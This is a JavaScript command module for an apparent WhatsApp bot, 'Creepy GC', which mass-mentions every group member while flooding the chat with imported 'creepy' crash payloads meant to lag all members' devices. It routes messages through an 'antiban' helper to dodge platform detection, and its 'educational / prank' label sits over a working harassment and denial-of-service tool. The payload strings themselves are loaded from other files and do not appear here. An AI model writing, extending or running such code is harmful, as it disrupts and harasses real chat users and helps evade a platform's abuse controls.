/**
 * 🐛 Tech God Bug 2026 — Creepy GC (Group Chat Bomb)
 * Sends CREEPY payloads into a group chat to lag all members.
 * Combines mass mention + creepy payload for maximum impact.
 * ⚠️ EDUCATIONAL / PRANK USE ONLY
 * By Dev-Ntando (payload source: CREEPY_MD-V1)
 */
'use strict';

const config  = require('../../config');
const antiban = require('../../utils/antiban');
const db      = require('../../database');

const { creepyd1 } = require('./creepy-data/creepyd1');
const { creepyd3 } = require('./creepy-data/creepyd3');
const { creepyd6 } = require('./creepy-data/creepyd6');

const payloads = [creepyd1, creepyd3, creepyd6].filter(Boolean);

module.exports = async (sock, msg, args, { isOwner, sender, jid }) => {
  if (!config.bugsEnabled.crash) {
    return antiban.sendHuman(sock, jid, { text: '❌ Crash bugs are currently disabled.' }, { quoted: msg });
  }

  // Must be used in a group
  const isGroup = jid.endsWith('@g.us');
  if (!isGroup) {
    return antiban.sendHuman(sock, jid, {
      text: `🐛 *Creepy GC* can only be used in groups.`,
    }, { quoted: msg });
  }

  if (!isOwner) {
    return antiban.sendHuman(sock, jid, { text: '👑 *Creepy GC is owner-only.*' }, { quoted: msg });
  }

  const rounds = Math.min(parseInt(args[0]) || 3, 6);

  // Get all group members for mass mention
  let participants = [];
  try {
    const groupMeta = await sock.groupMetadata(jid);
    participants = groupMeta.participants.map(p => p.id);
  } catch (e) {
    participants = [];
  }

  await antiban.sendHuman(sock, jid, {
    text: `🐛 *CREEPY GC BOMB ACTIVATED*\n💣 Rounds: ${rounds}\n👥 Mentioning: ${participants.length} members\n\n_Incoming chaos..._`,
  }, { quoted: msg });

  for (let i = 0; i < rounds; i++) {
    const payload = payloads[i % payloads.length];
    const text = typeof payload === 'function' ? payload(config.prefix) : payload;

    await sock.sendMessage(jid, {
      text: text,
      mentions: participants
    });
    await new Promise(r => setTimeout(r, 800));
  }

  db.incrementStat('totalBugs');
  db.incrementUserStat(sender, 'bugs');

  await antiban.sendHuman(sock, jid, {
    text: `✅ *Creepy GC bomb complete!*\n🐛 ${rounds} rounds delivered to this group.`,
  }, { quoted: msg });
};
